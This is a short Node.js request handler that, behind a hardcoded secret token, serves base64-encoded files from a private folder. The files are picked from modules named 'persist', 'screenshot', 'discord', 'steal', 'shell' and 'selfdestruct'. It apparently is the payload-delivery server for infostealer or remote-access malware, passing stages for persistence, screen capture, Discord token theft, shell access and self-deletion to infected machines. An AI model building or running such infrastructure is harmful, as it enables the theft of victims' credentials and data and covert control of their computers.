const fs = require('fs');
const path = require('path');

const SECRET = 'adc18417c855bc614173a4ad33497d82a2a95a7a6b46e2105df3971abd26357d';

module.exports = (req, res) => {
    const module = req.query.module;

    if (req.headers['x-token'] !== SECRET) {
        return res.status(403).send('Forbidden');
    }

    const allowed = ['persist','screenshot','abe','discord','steal','steal2','shell','selfdestruct','steal3'];
    if (!allowed.includes(module)) {
        return res.status(404).send('Not Found');
    }

    const filePath = path.join(process.cwd(), 'private', module + '.b64');
    if (!fs.existsSync(filePath)) {
        return res.status(404).send('Not Found');
    }

    res.setHeader('Content-Type', 'application/octet-stream');
    res.send(fs.readFileSync(filePath));
};
